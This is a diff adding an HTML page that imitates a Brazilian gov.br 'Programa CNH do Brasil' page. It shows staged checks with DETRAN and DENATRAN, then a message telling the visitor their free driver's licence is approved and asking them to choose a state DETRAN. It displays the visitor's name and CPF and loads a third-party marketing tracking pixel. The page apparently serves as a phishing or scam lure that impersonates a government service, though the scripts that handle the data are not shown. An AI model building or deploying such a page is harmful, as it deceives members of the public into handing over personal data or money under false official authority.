@@ -1,0 +1,132 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <script src="js/latest.js" async="" defer=""></script>
+    <script>
+      window.pixelId = "6983ef4f560f5bf5f424682e";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificando Disponibilidade - CNH do Brasil | gov.br</title>
+    <link rel="stylesheet" href="css/shared.css">
+    <link rel="stylesheet" href="css/verify-availability.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+</head>
+<body>
+    <header class="va-header">
+        <div class="header-row-top">
+            <div class="header-left">
+                <a href="../inicio/" class="logo-gov">
+                    <img src="images/imgi_6_image.jpg" alt="gov.br">
+                </a>
+                <button class="btn-header-icon" aria-label="Menu">
+                    <i class="fas fa-ellipsis-v"></i>
+                </button>
+            </div>
+            <div class="header-right">
+                <button class="btn-header-icon" aria-label="Notificações">
+                    <i class="fas fa-bell"></i>
+                </button>
+                <button class="btn-header-icon" aria-label="Aplicativos">
+                    <i class="fas fa-th"></i>
+                </button>
+                <button class="btn-user">
+                    <i class="fas fa-user"></i>
+                    <span class="user-name">Usuário</span>
+                </button>
+                <button class="btn-header-icon btn-search" aria-label="Pesquisar">
+                    <i class="fas fa-search"></i>
+                </button>
+            </div>
+        </div>
+        <div class="header-nav">
+            <button class="btn-hamburger" aria-label="Menu">
+                <span></span><span></span><span></span>
+            </button>
+            <span class="nav-title">Programa CNH do Brasil</span>
+            <button class="btn-header-icon btn-search-nav" aria-label="Pesquisar">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </header>
+
+    <main class="va-main">
+        <div class="va-container">
+            <div class="user-data-section">
+                <div class="data-field full-width">
+                    <label>Nome Completo</label>
+                    <div class="data-value" id="user-name">—</div>
+                </div>
+                <div class="data-row">
+                    <div class="data-field">
+                        <label>CPF</label>
+                        <div class="data-value" id="user-cpf">—</div>
+                    </div>
+                    <div class="data-field">
+                        <label>Nascimento</label>
+                        <div class="data-value" id="user-birth">22/04/1975</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="verification-phase" id="loading-phase">
+                <div class="verification-list">
+                    <div class="verification-item" data-step="1">
+                        <span class="verification-icon loading dots-loader">
+                            <span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span>
+                        </span>
+                        <span class="verification-text">Verificando dados junto ao DETRAN</span>
+                    </div>
+                    <div class="verification-item pending" data-step="2">
+                        <span class="verification-icon">
+                            <i class="far fa-circle"></i>
+                        </span>
+                        <span class="verification-text">Consultando elegibilidade do CPF no DENATRAN</span>
+                    </div>
+                    <div class="verification-item pending" data-step="3">
+                        <span class="verification-icon">
+                            <i class="far fa-circle"></i>
+                        </span>
+                        <span class="verification-text">Verificando disponibilidade de vagas no programa</span>
+                    </div>
+                    <div class="verification-item pending" data-step="4">
+                        <span class="verification-icon">
+                            <i class="far fa-circle"></i>
+                        </span>
+                        <span class="verification-text">Analisando documentação junto ao Ministério dos Transportes</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="result-phase hidden" id="result-phase">
+                <div class="success-box">
+                    <h2 class="success-title">Parabéns! Cadastro Aprovado com Sucesso</h2>
+                    <p class="success-text">
+                        Prezado(a) <strong id="result-name">—</strong>, CPF <strong id="result-cpf">—</strong>, informamos que sua solicitação foi analisada e <strong>APROVADA</strong> pelo Sistema Nacional de Habilitação.
+                    </p>
+                    <p class="success-text">
+                        O(A) senhor(a) está apto(a) a obter a Carteira Nacional de Habilitação (CNH) de forma <a href="#">gratuita</a>, sem a necessidade de frequentar autoescola, conforme as diretrizes do Programa CNH do Brasil.
+                    </p>
+                    <p class="success-text instruction">
+                        Para dar continuidade ao processo, selecione abaixo o DETRAN correspondente ao seu estado de residência.
+                    </p>
+                </div>
+
+                <div class="state-selection">
+                    <h3 class="section-title">Selecione o DETRAN do seu Estado</h3>
+                    <div class="states-list" id="states-list">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script src="js/shared.js"></script>
+    <script src="js/verify-availability.js"></script>
+
+
+</body></html>
